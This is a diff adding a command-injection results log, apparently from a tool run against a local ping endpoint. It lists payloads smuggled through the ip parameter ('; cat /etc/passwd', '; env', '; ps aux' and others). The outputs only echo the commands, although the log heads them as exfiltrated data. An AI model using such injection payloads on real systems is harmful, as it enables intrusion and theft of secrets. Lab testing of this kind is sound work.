@@ -1,0 +1,56 @@
+======================================================================
+COMMAND INJECTION EXTRACTION RESULTS
+======================================================================
+Target:    http://localhost:5555/ping?ip=127.0.0.1
+Parameter: ip
+OS:        Linux
+User:      html
+Date:      2026-09-30 19:18:28.762094
+
+EXFILTRATED DATA
+----------------------------------------
+
+=== passwd ===
+Command: ; cat /etc/passwd
+Output:
+ping -c 1 ; cat /etc/passwd
+
+=== hosts ===
+Command: ; cat /etc/hosts
+Output:
+ping -c 1 ; cat /etc/hosts
+
+=== hostname ===
+Command: ; cat /etc/hostname
+Output:
+ping -c 1 ; cat /etc/hostname
+
+=== env ===
+Command: ; env
+Output:
+ping -c 1 ; env
+
+=== id ===
+Command: ; id
+Output:
+ping -c 1 ; id
+
+=== uname ===
+Command: ; uname -a
+Output:
+ping -c 1 ; uname -a
+
+=== whoami ===
+Command: ; whoami
+Output:
+ping -c 1 ; whoami
+
+=== processes ===
+Command: ; ps aux
+Output:
+ping -c 1 ; ps aux
+
+=== network ===
+Command: ; ip a 2>/dev/null || ifconfig
+Output:
+ping -c 1 ; ip a 2>/dev/null || ifconfig
